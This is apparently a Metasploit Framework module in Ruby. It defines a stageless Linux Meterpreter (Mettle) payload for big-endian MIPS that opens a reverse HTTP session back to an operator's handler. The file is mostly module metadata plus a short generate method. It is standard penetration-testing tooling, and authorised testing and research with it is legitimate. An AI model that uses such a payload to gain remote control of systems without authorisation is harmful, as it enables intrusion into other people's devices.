##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/base/sessions/meterpreter_options'
require 'msf/base/sessions/mettle_config'
require 'msf/base/sessions/meterpreter_mipsbe_linux'

module MetasploitModule

  CachedSize = 1007024

  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions
  include Msf::Sessions::MettleConfig

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Linux Meterpreter, Reverse HTTP Inline',
        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
        'Author'        => [
          'Adam Cammack <adam_cammack[at]rapid7.com>',
          'Brent Cook <brent_cook[at]rapid7.com>'
        ],
        'Platform'      => 'linux',
        'Arch'          => ARCH_MIPSBE,
        'License'       => MSF_LICENSE,
        'Handler'       => Msf::Handler::ReverseHttp,
        'Session'       => Msf::Sessions::Meterpreter_mipsbe_Linux
      )
    )
  end

  def generate
    opts = {
      scheme: 'http',
      stageless: true
    }
    MetasploitPayloads::Mettle.new('mips-linux-muslsf', generate_config(opts)).to_binary :exec
  end
end